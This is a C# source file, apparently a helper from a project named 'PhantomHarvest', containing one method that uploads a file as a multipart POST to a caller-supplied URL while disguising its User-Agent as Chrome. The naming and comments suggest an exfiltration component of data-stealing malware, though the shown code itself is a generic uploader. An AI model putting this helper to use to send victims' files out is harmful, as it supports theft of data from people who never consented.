using System;
using System.IO;
using System.Net;
using System.Text;

namespace PhantomHarvest.Helper
{
	internal class NetSender
	{
		public static void SendFile(byte[] data, string filename, string url)
		{
			try
			{
				// 强制使用 TLS 1.2 (3072) - .NET 4.0 需要强转
				ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;

				// 使用提供的 URL 发送数据，而不是硬编码
				// Use provided URL to send data, avoiding hardcoded values
				string boundary = "---------------------------" + DateTime.Now.Ticks.ToString("x");
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
				httpWebRequest.ContentType = "multipart/form-data; boundary=" + boundary;
				httpWebRequest.Method = "POST";
				httpWebRequest.KeepAlive = true;
				// 伪装 User-Agent
				httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36";
				
				using (Stream requestStream = httpWebRequest.GetRequestStream())
				{
					// 修正 Multipart 格式：第一个 boundary 前不需要换行，且添加 Content-Type
					byte[] headerBytes = Encoding.ASCII.GetBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"document\"; filename=\"" + filename + "\"\r\nContent-Type: application/octet-stream\r\n\r\n");
					requestStream.Write(headerBytes, 0, headerBytes.Length);
					requestStream.Write(data, 0, data.Length);
					byte[] footerBytes = Encoding.ASCII.GetBytes("\r\n--" + boundary + "--\r\n");
					requestStream.Write(footerBytes, 0, footerBytes.Length);
				}
				
				using (WebResponse response = httpWebRequest.GetResponse())
				{
					// Success
				}
			}
			catch (WebException wex)
			{
				Console.WriteLine("NetSender WebException: " + wex.Message);
				if (wex.Response != null)
				{
					using (var errorResponse = (HttpWebResponse)wex.Response)
					{
						using (var reader = new StreamReader(errorResponse.GetResponseStream()))
						{
							string errorText = reader.ReadToEnd();
							Console.WriteLine("Server Response: " + errorText);
						}
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine("NetSender Exception: " + ex.ToString());
			}
		}
	}
}
